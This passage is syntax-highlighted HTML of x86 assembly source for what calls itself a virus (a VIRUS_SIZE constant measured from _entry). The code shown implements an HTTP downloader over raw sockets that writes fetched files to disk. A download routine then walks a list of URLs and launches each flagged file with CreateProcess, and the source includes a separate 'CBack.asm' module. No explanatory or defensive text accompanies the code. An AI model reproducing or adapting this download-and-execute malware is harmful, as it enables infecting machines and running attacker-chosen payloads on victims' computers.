    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((((</span><span class="sc2">80</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF00</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">80</span><span class="sc0"> </span><span class="sc4">&gt;&gt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">DL_FILENAME</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HTTP_BUFFER</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">


</span><span class="sc5">.recvLoop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HTTP_BUFFER</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HTTP_BUFFER_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">.recvEnd</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">HTTP_NEWLINE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.write</span><span class="sc0">

</span><span class="sc2">.1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0A0D0A0D</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc2">.2</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">.recvLoop</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">
</span><span class="sc2">.2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">HTTP_NEWLINE</span><span class="sc0">

</span><span class="sc5">.write</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.recvLoop</span><span class="sc0">

</span><span class="sc5">.recvEnd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">


</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DL_FILENAME</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">@Download</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">URLS</span><span class="sc0">

</span><span class="sc5">.nextUrl</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@GetUrl</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_EXECUTE_URL</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.nextUrl</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.nextUrl</span><span class="sc0">

</span><span class="sc1">;execute file</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">.push0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.push0</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcess</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.nextUrl</span><span class="sc0">


</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc9">%include</span><span class="sc0">        </span><span class="sc3">"CBack.asm"</span><span class="sc0">



</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">         </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)</span><span class="sc0">
</span></div></body>
</html>
